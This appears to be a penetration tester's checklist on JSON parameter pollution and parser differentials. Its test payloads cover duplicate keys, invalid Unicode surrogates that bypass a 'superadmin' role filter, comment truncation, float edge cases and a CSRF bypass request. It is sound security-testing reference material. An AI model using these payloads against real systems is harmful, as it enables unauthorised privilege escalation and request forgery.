# Json 
### parameter polution
```json
{"id": 2} => {"id": [2]}
{"id": 2} => {"id": {"id": 2}}
{"id": 2} => {"id": 1, "id": 2}
{"id": 2} => {"id": 2, "id": 1}
{"id": 2} => {"id": "*"}
```
## JSON Interoperability / Inconsistency
Source: [https://bishopfox.com/blog/json-interoperability-vulnerabilities](https://bishopfox.com/blog/json-interoperability-vulnerabilities)
### 1. Inconsistent Duplicate Key Precedence
- [ ]  Test duplicate keys with conflicting values
```json
"cart": [
    {
        "id": 0,
        "qty": 5
    },
    {
        "id": 1,
        "qty": -1,
        "qty": 1
    }
]
```

---
### 2. Character Truncation and Comments

- [ ] Character Truncation
	- [ ]  Inject raw control characters
```json
{"test": 1, "test\[raw \x0d byte]": 2}
```
- [ ]  Use invalid UTF-16 surrogate
```json
{"test": 1, "test\ud800": 2}
```
- [ ]  Break string parsing
```json
{"test": 1, "test"": 2}
{"test": 1, "te\st": 2}
```
- [ ] Python stdlib `json` vs `ujson`
	- [ ]  Test role validation bypass via malformed Unicode
```json
"roles": ["superadmin"]
# => 'superadmin' is forbidden
```
- [ ]  Append invalid surrogate to bypass filtering
```json
"roles": ["superadmin\ud888"]
# => OK: Created user
```
- [ ] Comment Truncation / Non-Standard Parsers
	- [ ]  Test unquoted values + comment support
```javascript
obj = {"test": valWithoutQuotes, keyWithoutQuotes: "test" /* Comment support */}
```
- [ ]  Hide duplicate keys inside comments
```javascript
obj = {
    "description": "Duplicate with comments",
    "test": 2,
    "extra": /*, "test": 1, "extra2": */
}
```
- [ ]  Override values using commented tail
```javascript
obj = {
    "description": "Comment support",
    "test": 1,
    "extra": "a"/*, "test": 2, "extra2": "b"*/
}
```

---
### 3. JSON Serialization Quirks
- [ ]  Test duplicate key behavior between access and serialization
```javascript
obj = {"test": 1, "test": 2}

obj["test"]      // 1
obj.toString()   // {"test": 2}
```

---
### 4. Float and Integer Representation
- [ ]  Test extremely large floats
```json
{"description":"Big float","test":1.0e4096}
```
- [ ]  Test special float values
```json
{"description":"Big float","test":Infinity}
{"description":"Big float","test":"+Infinity"}
{"description":"Big float","test":Inf}
```
- [ ]  Test null coercion
```json
{"description":"Big float","test":null}
```
- [ ]  Test precision edge cases
```json
{"description":"Big float","test":3.0e14159265358979323846}
{"description":"Big float","test":9.218868437227405E+18}
```
- [ ]  Check if string/null coerces to zero
```
=> if string/null ==> == 0
```

---
### 5. One-off Bugs
- [ ] CSRF Bypass Variant
	- [ ]  Send JSON body with form content-type and trailing equals
```
POST / HTTP/1.1
...
Content-Type: application/x-www-form-urlencoded

{"test": 1}=
```
# Parser Differentials 

- [Unexpected security footguns in Go's parsers](https://blog.trailofbits.com/2025/06/17/unexpected-security-footguns-in-gos-parsers/)
- [Security Implications of URL Parsing Differentials](https://www.sonarsource.com/blog/security-implications-of-url-parsing-differentials/#)
- [Breaking Down Multipart Parsers: File upload validation bypass](https://blog.sicuranext.com/breaking-down-multipart-parsers-validation-bypass/)

	